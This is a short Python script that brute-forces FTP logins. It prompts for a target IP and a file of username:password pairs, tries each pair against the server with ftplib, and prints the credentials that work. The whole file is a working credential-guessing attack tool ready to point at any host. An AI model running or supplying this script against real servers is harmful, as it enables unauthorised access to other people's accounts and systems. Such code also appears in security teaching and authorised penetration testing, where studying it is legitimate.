import ftplib

def bruteLogin(hostname, passwdFile):
    try:
        pF = open(passwdFile, "r")
    except:
        print("[!!] file dose not exists!")

    for line in pF.readlines():
        try:
            username = line.split(":")[0]
            password = line.split(":")[1].strip("\n")
            print("[+] trying credentials: %s:%s" % (username, password))
            ftp = ftplib.FTP(hostname)
            login = ftp.login(username, password)
            print("\n success! we logged in using: %s:%s" % (username, password))
            ftp.quit()
            print("\n", "\t"*2, "#"*75, "\n")
        except:
            print("[-] username and password not found!!")
            print("\n", "\t"*2, "#"*75, "\n")

print("\n", "\t"*5, "--->>> ftp brute force <<<---", "\n")
host = input("[+] enter the target ip: ")
passwdFile = input("[+] enter the directory or file name, should be like (username:password): ")
bruteLogin(host, passwdFile)

